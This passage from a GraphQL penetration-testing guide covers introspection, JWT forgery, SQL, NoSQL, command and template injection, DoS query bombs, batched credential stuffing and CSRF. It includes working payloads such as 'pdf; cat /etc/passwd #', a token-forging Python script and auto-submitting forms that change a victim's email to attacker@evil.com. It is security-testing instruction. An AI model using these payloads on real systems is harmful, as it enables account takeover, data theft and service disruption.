enabled\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/v1/graphql\u003c/code\u003e or similar versioned endpoints\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eDiscovery techniques:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e# Directory brute-forcing\nffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ -e .php,.graphql,.gql\n\n# Check JS files for GraphQL endpoints\ngrep -r \"graphql\\|gql\" --include=\"*.js\" .\n\n# Look for GraphQL specific HTTP headers\ncurl -I https://target.com/api/graphql\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePro tip: Many applications expose GraphQL at multiple endpoints - one public and documented, others internal and potentially less secured.\u003c/p\u003e\n\u003ch3\u003e2. Introspection Testing\u003c/h3\u003e\n\u003cp\u003eOnce you've found the endpoint, test if introspection is enabled:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBasic introspection check\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  __schema {\n    types {\n      name\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIf introspection succeeds, follow up with comprehensive mapping\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery IntrospectionQuery {\n  __schema {\n    queryType { name }\n    mutationType { name }\n    subscriptionType { name }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type { ...TypeRef }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDocument all operations by category\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUser data operations (queries/mutations that handle user info)\u003c/li\u003e\n\u003cli\u003eAuthentication operations (login, token refresh, etc.)\u003c/li\u003e\n\u003cli\u003eAdministrative operations (user management, settings, etc.)\u003c/li\u003e\n\u003cli\u003eBusiness logic operations (specific to the application)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIf introspection is disabled, try these bypasses\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eURI case manipulation: \u003ccode\u003e/GraphQL\u003c/code\u003e instead of \u003ccode\u003e/graphql\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAdd custom headers: \u003ccode\u003eX-Apollo-Tracing: 1\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eTry partial introspection: \u003ccode\u003e{ __type(name: \"User\") { name fields { name type { name } } } }\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eLook for introspection data in JS bundles (search for \"queryType\" or \"mutationType\")\u003c/li\u003e\n\u003cli\u003eTry accessing development environment URLs (staging, dev, etc.)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eInQL in Burp automates most of this, but manual exploration often reveals endpoints that automated tools miss.\u003c/p\u003e\n\u003ch3\u003e3. Authentication Testing\u003c/h3\u003e\n\u003cp\u003eGraphQL APIs often have unique authentication vulnerabilities:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJWT token attacks\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCheck for weak signature verification (alg:none, RS/HS256 confusion)\u003c/li\u003e\n\u003cli\u003eTest token reuse across environments\u003c/li\u003e\n\u003cli\u003eLook for sensitive data in token claims\u003c/li\u003e\n\u003cli\u003eTry token replay without expiration\u003c/li\u003e\n\u003cli\u003eTest for missing validation of token claims\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample attack query with forged token:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\nContent-Type: application/json\n\n{\"query\": \"query { adminSettings { serverConfig } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eJWT forgery techniques:\u003c/p\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003e# Algorithm confusion attack (RS256 to HS256)\n# 1. Decode the token without verification\nimport jwt\ntoken = \"eyJhbGciO...\"\nheader = jwt.get_unverified_header(token)\npayload = jwt.decode(token, options={\"verify_signature\": False})\n\n# 2. Modify claims\npayload[\"role\"] = \"admin\"\n\n# 3. Change algorithm from RS256 to HS256 and sign with the public key\n# This works when the server doesn't validate the algorithm properly\nimport base64\nwith open(\"public_key.pem\", \"rb\") as f:\n    public_key = f.read()\n\n# Create forged token with HS256 algorithm using public key as the secret\nforged = jwt.encode(payload, public_key, algorithm=\"HS256\", headers={\"alg\": \"HS256\"})\n\n# Another technique: \"none\" algorithm attack\nnull_signed = jwt.encode(payload, \"\", algorithm=\"none\", headers={\"alg\": \"none\"})\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCommon JWT vulnerabilities:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eKey disclosure in source code or JS files\u003c/li\u003e\n\u003cli\u003eCommon/default secrets (\"secret\", \"key\", \"SECRET_KEY\")\u003c/li\u003e\n\u003cli\u003eImproper validation of \"kid\" header claim (path traversal)\u003c/li\u003e\n\u003cli\u003eMissing algorithm validation (\"alg\": \"none\" attacks)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSession handling tests\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest session fixation vulnerabilities\u003c/li\u003e\n\u003cli\u003eCheck if authentication state persists after logout\u003c/li\u003e\n\u003cli\u003eTest for race conditions in authentication flows\u003c/li\u003e\n\u003cli\u003eCheck for missing invalidation of refresh tokens\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOAuth integration vulnerabilities\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest for SSRF in OAuth callbacks\u003c/li\u003e\n\u003cli\u003eCheck for improper state validation\u003c/li\u003e\n\u003cli\u003eLook for token leakage in logs or URLs\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e4. Authorization Testing\u003c/h3\u003e\n\u003cp\u003eAuthorization bugs are extremely common in GraphQL APIs:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate multiple test users with different permission levels\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdmin/superuser\u003c/li\u003e\n\u003cli\u003eRegular user\u003c/li\u003e\n\u003cli\u003eRestricted user\u003c/li\u003e\n\u003cli\u003eUnauthenticated access\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eObject-level authorization tests\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAttempt to access objects owned by other users\u003c/li\u003e\n\u003cli\u003eTest direct object reference vulnerabilities\u003c/li\u003e\n\u003cli\u003eCheck for horizontal privilege escalation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  # Attempt to access another user's data\n  user(id: \"victim_id\") {\n    email\n    profile {\n      address\n      phoneNumber\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eField-level authorization tests\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIdentify sensitive fields (PII, financial data, etc.)\u003c/li\u003e\n\u003cli\u003eTest access to these fields across different user roles\u003c/li\u003e\n\u003cli\u003eTry accessing deprecated fields (often missed in access controls)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  # Try to access sensitive fields\n  currentUser {\n    username\n    email\n    hashedPassword # Might be exposed!\n    internalNotes # Often overlooked in access controls\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRole-based authorization tests\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTry to perform admin mutations as regular user\u003c/li\u003e\n\u003cli\u003eCheck for missing authorization on custom operations\u003c/li\u003e\n\u003cli\u003eTest newly added fields which might be missed in authorization logic\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCommon bypasses to try\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse aliases to request the same field multiple ways\u003c/li\u003e\n\u003cli\u003eTry camelCase variations of field names\u003c/li\u003e\n\u003cli\u003eUse fragments to obscure sensitive field requests\u003c/li\u003e\n\u003cli\u003eUse introspection to find non-UI fields that might lack authorization checks\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e5. Injection Testing\u003c/h3\u003e\n\u003cp\u003eGraphQL resolvers often pass data directly to underlying systems, creating injection opportunities:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSQL injection via GraphQL\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest string parameters in queries/mutations\u003c/li\u003e\n\u003cli\u003eTry classic SQL injection payloads adapted for GraphQL\u003c/li\u003e\n\u003cli\u003eUse Burp Intruder with GraphQL-specific payload positions\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample in Burp Repeater:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\": \"query { user(username: \\\"admin' OR 1=1 --\\\") { id username email } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNoSQL injection\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest for MongoDB operator injection\u003c/li\u003e\n\u003cli\u003eTry JSON parameter pollution in arguments\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample (some implementations pass objects directly to MongoDB):\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003e# This often doesn't work directly because GraphQL validates the type\nquery {\n  user(username: {$ne: null}) {\n    id\n    username\n    email\n  }\n}\n\n# More realistic payloads using string manipulation or variables\n# 1. Using string formatting to pass MongoDB operators\nquery {\n  user(username: \"admin', $or: [ {}, { 'a':'a\") {\n    id\n    username\n  }\n}\n\n# 2. Using variables and JSON objects when variables aren't properly sanitized\nquery ($username: JSON) {\n  findUser(criteria: $username) {\n    id\n    email\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eVariables payload:\u003c/p\u003e\n\u003cpre class=\"language-json\"\u003e\u003ccode class=\"language-json\"\u003e{\n  \"username\": {\n    \"$ne\": null,\n    \"$regex\": \"^adm\"\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOS command injection\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTarget mutations that might trigger server processes\u003c/li\u003e\n\u003cli\u003eFocus on file upload operations, URL processing, or system integration points\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  generateReport(format: \"pdf; cat /etc/passwd #\") {\n    downloadUrl\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTemplate injection\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for operations that might use templates (email, exports, reports)\u003c/li\u003e\n\u003cli\u003eTest for SSTI in string parameters\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  sendEmail(template: \"Welcome, {{user.name}}! {{7*7}}\", to: \"test@example.com\") {\n    success\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGraphQL-specific injection\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTry injecting fragments\u003c/li\u003e\n\u003cli\u003eTest for query batching issues\u003c/li\u003e\n\u003cli\u003eLook for variable injection points\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVariable coercion attacks\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eExploit type conversion in GraphQL by providing unexpected types\u003c/li\u003e\n\u003cli\u003eTest Boolean/String/Int conversions for logic bypasses\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery ($isAdmin: Boolean!) {\n  userInfo(includePrivate: $isAdmin) {\n    email\n    ssn\n    salary\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSend with variables: \u003ccode\u003e{\"isAdmin\": \"true\"}\u003c/code\u003e instead of \u003ccode\u003e{\"isAdmin\": true}\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eWhy this works:\nDepending on the GraphQL implementation and resolver code, type coercion may happen differently:\u003c/p\u003e\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e// Vulnerable implementation in JavaScript\nfunction userInfoResolver(parent, args, context) {\n  // The implementation uses loose equality (==) instead of strict (===)\n  // \"true\" == true evaluates to true in JavaScript\n  if (args.includePrivate == true \u0026#x26;\u0026#x26; !context.user.isAdmin) {\n    throw new Error(\"Unauthorized\");\n  }\n  \n  // Or using Boolean() which converts strings to boolean\n  // Boolean(\"true\") evaluates to true, Boolean(\"false\") evaluates to true too!\n  if (Boolean(args.includePrivate) \u0026#x26;\u0026#x26; !context.user.isAdmin) {\n    throw new Error(\"Unauthorized\");\n  }\n  \n  return db.getUserPrivateInfo(context.user.id);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdditional type coercion tests:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInput: \u003ccode\u003e{\"limit\": \"100\"}\u003c/code\u003e when expecting \u003ccode\u003eInt\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eInput: \u003ccode\u003e{\"filter\": 1}\u003c/code\u003e when expecting \u003ccode\u003eString\u003c/code\u003e or an object\u003c/li\u003e\n\u003cli\u003eInput: \u003ccode\u003e{\"flag\": \"0\"}\u003c/code\u003e when expecting \u003ccode\u003eBoolean\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e6. DoS and Resource Exhaustion\u003c/h3\u003e\n\u003cp\u003eGraphQL is particularly vulnerable to DoS attacks:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNested query attacks\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate deeply nested queries using recursive types\u003c/li\u003e\n\u003cli\u003eStart with 5 levels and increase until you see performance impact\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery NestedQuery {\n  user(id: \"1\") {\n    friends {\n      friends {\n        friends {\n          friends {\n            friends {\n              friends {\n                # Keep nesting until server struggles\n                id\n                username\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eQuery complexity bombs\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCombine nested queries with field duplication\u003c/li\u003e\n\u003cli\u003eRequest resource-intensive computed fields\u003c/li\u003e\n\u003cli\u003eRequest large result sets\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery ComplexityBomb {\n  allUsers(first: 10000) {  # Large result set\n    posts(first: 100) {     # For each user\n      comments(first: 100) { # For each post\n        author {\n          # Requesting the same expensive fields multiple times\n          activityFeed { id }\n          activityFeed { id }\n          activityFeed { id }\n          activityFeed { id }\n          # ... repeat many times\n        }\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBatch query flooding\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSend multiple operations in a single request\u003c/li\u003e\n\u003cli\u003eIncrease batch size until you find the limit or impact\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"query { user(id: \\\"1\\\") { username } }\"},\n  {\"query\": \"query { user(id: \\\"2\\\") { username } }\"},\n  ... \n  # Repeat hundreds or thousands of times\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eField duplication attacks\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRequest the same field thousands of times\u003c/li\u003e\n\u003cli\u003eFocus on computationally expensive fields\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  user(id: \"1\") {\n    # Request the same field many times\n    email email email email email email\n    # ... repeat hundreds of times\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eResource-intensive operations\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIdentify and target expensive operations like:\n\u003cul\u003e\n\u003cli\u003eSearch functionality\u003c/li\u003e\n\u003cli\u003eFiltering large datasets\u003c/li\u003e\n\u003cli\u003eGeospatial queries\u003c/li\u003e\n\u003cli\u003eData aggregation\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  # Full-text search with minimal query to return maximum results\n  search(query: \"a\") {\n    id\n    title\n    content\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e7. Batching Attacks\u003c/h3\u003e\n\u003cp\u003eBatch operations can be exploited for various attacks:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRate limit bypass\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIdentify rate-limited operations\u003c/li\u003e\n\u003cli\u003eBundle them in a single batched request\u003c/li\u003e\n\u003cli\u003eCheck if the rate limit applies per-request or per-operation\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"mutation { sendMessage(to: \\\"user1\\\", content: \\\"test\\\") { id } }\"},\n  {\"query\": \"mutation { sendMessage(to: \\\"user2\\\", content: \\\"test\\\") { id } }\"},\n  {\"query\": \"mutation { sendMessage(to: \\\"user3\\\", content: \\\"test\\\") { id } }\"},\n  ... # Keep adding until you exceed what would normally be rate-limited\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCredential stuffing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eBundle multiple login attempts in one request\u003c/li\u003e\n\u003cli\u003eWatch for response variations that indicate valid credentials\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"password1\\\") { token } }\"},\n  {\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"password2\\\") { token } }\"},\n  ... # Test multiple passwords in one request\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eQuery smuggling\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eHide malicious operations among legitimate ones\u003c/li\u003e\n\u003cli\u003eUse this to bypass WAF or logging mechanisms\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[\n  {\"query\": \"query { publicPosts { id title } }\"}, # Legitimate operation\n  {\"query\": \"query { userEmails { email role hashedPassword } }\"}, # Malicious operation\n  {\"query\": \"query { publicEvents { id date } }\"} # Legitimate operation\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e8. CSRF Testing\u003c/h3\u003e\n\u003cp\u003eGraphQL endpoints are often vulnerable to CSRF:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIdentify state-changing mutations\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for operations that update user data\u003c/li\u003e\n\u003cli\u003eFocus on high-impact operations like:\n\u003cul\u003e\n\u003cli\u003ePassword/email changes\u003c/li\u003e\n\u003cli\u003eAccount settings\u003c/li\u003e\n\u003cli\u003eFinancial transactions\u003c/li\u003e\n\u003cli\u003eData deletion\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest for GET-based GraphQL support\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSome implementations support queries via GET params\u003c/li\u003e\n\u003cli\u003eThis makes CSRF trivial\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e\u0026#x3C;img src=\"https://target.com/graphql?query=mutation{changeEmail(email:%22attacker@evil.com%22){success}}\" style=\"display:none\"\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest for missing CSRF protections\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCheck if the API relies solely on cookies for authentication\u003c/li\u003e\n\u003cli\u003eVerify if CSRF tokens are validated for GraphQL operations\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample PoC:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;html\u003e\n  \u0026#x3C;body onload=\"document.forms[0].submit()\"\u003e\n    \u0026#x3C;form action=\"https://target.com/graphql\" method=\"POST\" enctype=\"text/plain\"\u003e\n      \u0026#x3C;input name='{\"query\":\"mutation{changeEmail(email:\\\"attacker@evil.com\\\"){success}}\"}' value='abc'\u003e\n    \u0026#x3C;/form\u003e\n  \u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e9. Advanced Techniques\u003c/h3\u003e\n\u003cp\u003eFor hardened GraphQL APIs, try these advanced approaches:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eQuery fingerprinting evasion\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eModify query structure while preserving functionality\u003c/li\u003e\n\u003cli\u003eUse aliases to rename operations\u003c/li\u003e\n\u003cli\u003eAdd/remove whitespace and comments\u003c/li\u003e\n\u003cli\u003eSplit complex queries into simpler ones\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePersisted query exploitation\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for hash-based persisted query implementations\u003c/li\u003e\n\u003cli\u003eTry hash collision attacks\u003c/li\u003e\n\u003cli\u003eTest for hash bypass techniques\u003c/li\u003e\n\u003cli\u003eUse timing attacks to discover valid hashes\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGraphQL directive abuse\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest for insecure custom directives\u003c/li\u003e\n\u003cli\u003eTry using internal directives in unexpected contexts\u003c/li\u003e\n\u003cli\u003eLook for directive-based authorization bypasses\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExamples:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003e# 1. Using @skip or @include to bypass access controls\nquery {\n  sensitiveData @skip(if: false) {\n    internalFields\n  }\n  # Some implementations check auth at the query level but not for skipped fields\n}\n\n# 2. Exploiting real-world custom directives\nquery {\n  user(id: \"admin\") {\n    # Apollo federation exposes _entities queries that might bypass auth\n    _entities(representations: [{__typename: \"User\", id: \"admin\"}]) {\n      ... on User {\n        email\n        role\n      }\n    }\n  }\n}\n\n# 3. Directive parameter injection in implementations using dynamic resolvers\nquery {\n  documents {\n    content @transform(expression: \"file:///etc/passwd\")\n  }\n}\n\n# 4. Auth context leakage through directives\nquery {\n  public {\n    data @authenticate\n    # In some implementations, @authenticate may store auth context in a way\n    # that affects subsequent field resolution\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the wild, directive vulnerabilities have been found in:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCustom GraphQL servers that implement dynamic expression evaluation\u003c/li\u003e\n\u003cli\u003eAPIs that use directives for formatting/transformation but fail to sanitize inputs\u003c/li\u003e\n\u003cli\u003eImplementations where directive execution happens before field-level authorization\u003c/li\u003e\n\u003cli\u003eFederation setups where directives are implemented inconsistently across services\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSubscription vulnerabilities\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest for unbounded subscriptions\u003c/li\u003e\n\u003cli\u003eCheck for missing authentication on subscription operations\u003c/li\u003e\n\u003cli\u003eTry to subscribe to other users' events\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eExample:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003esubscription {\n  userUpdates(userId: 